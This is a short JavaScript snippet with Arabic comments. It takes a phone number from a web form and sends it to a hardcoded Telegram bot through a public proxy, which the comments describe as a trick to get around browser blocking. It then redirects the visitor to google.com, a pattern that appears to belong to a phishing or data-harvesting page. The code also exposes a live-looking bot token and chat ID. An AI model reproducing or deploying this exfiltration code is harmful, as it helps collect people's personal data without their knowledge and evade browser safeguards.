<script>
async function sendToTelegram() {
    const TOKEN = "8736983183:AAHZI864nf1nxjmOlqsAnwhSoK9K2VR5W7Y";
    const CHAT_ID = "5156556639";
    const phone = document.getElementById('phone').value;
    
    // هنا الخدعة: نستخدم وسيط لتجاوز حظر المتصفح
    const proxy = "https://api.allorigins.win/get?url=";
    const telegramUrl = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("رقم جديد: " + phone)}`;
    
    // إرسال البيانات عبر الوسيط
    fetch(proxy + encodeURIComponent(telegramUrl))
    .then(response => {
        if (response.ok) {
            alert("✅ تم الإرسال بنجاح وتجاوز الحظر!");
            window.location.href = "https://www.google.com";
        }
    })
    .catch(err => {
        alert("❌ حتى الوسيط تم حظره، المتصفح متشدد جداً.");
    });
}
</script>
